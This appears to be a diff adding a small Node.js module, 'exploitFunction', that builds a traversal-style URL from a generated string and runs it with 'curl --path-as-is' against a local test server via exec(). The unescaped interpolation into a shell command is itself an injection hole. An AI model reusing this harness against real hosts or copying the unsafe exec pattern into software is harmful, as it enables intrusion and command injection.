@@ -1,0 +1,13 @@
+function exploitFunction(payload) {
+  const { genstr } = payload;
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:9001${genstr()}"`;
+  exec(attack_string, (error, stdout) => {
+    if (error) {
+      console.error(`Error executing ${attack_string}: ${error}`);
+    } else {
+      return stdout;
+    }
+  });
+}
+
+module.exports = { exploitFunction };
